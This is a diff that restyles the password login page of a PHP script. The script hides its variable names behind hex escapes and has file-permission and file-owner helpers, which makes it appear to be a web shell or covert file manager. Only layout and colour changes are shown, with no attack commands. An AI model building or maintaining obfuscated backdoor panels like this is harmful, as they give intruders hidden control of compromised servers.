@@ -30,15 +30,20 @@ if(!isset(${"\x5f\x53\x45\x53\x53\x49\x4f\x4e"}["\x6c\x6f\x67\x67\x65\x64\x5f\x6
             body{background:#0d0d0d;color:#eee;font-family:monospace;text-align:center;padding-top:100px;}
             input{padding:6px;margin:5px;border-radius:4px;border:none;}
             input[type=password]{width:200px;}
-            input[type=submit]{background:#f1c40f;color:#fff;cursor:pointer;}
+            input[type=submit]{background:#f1c40f;color:#000;cursor:pointer;font-weight:bold;}
             .msg{color:#e74c3c;margin-top:10px;}
+            .login-row{display:flex;justify-content:center;align-items:center;gap:10px;margin-bottom:10px;}
+            .login-row label{font-size:14px;}
         </style>
     </head>
     <body>
         <h1><?=${"\x41\x50\x50\x5f\x4e\x41\x4d\x45"}?></h1>
         <form method="POST">
-            Password: <input type="password" name="password"><br>
-            <input type="submit" name="login" value="Login">
+            <div class="login-row">
+                <label>Password:</label>
+                <input type="password" name="password">
+                <input type="submit" name="login" value="Login">
+            </div>
         </form>
         <?php if(isset(${"\x6d\x73\x67"})) echo "<div class='msg'>".${"\x6d\x73\x67"}."</div>"; ?>
     </body>
@@ -46,7 +51,6 @@ if(!isset(${"\x5f\x53\x45\x53\x53\x49\x4f\x4e"}["\x6c\x6f\x67\x67\x65\x64\x5f\x6
     <?php
     exit;
 }
-
 function perms($file){ return substr(sprintf('%o', fileperms($file)), -4); }
 function owner($file){
     if(function_exists('posix_getpwuid')){
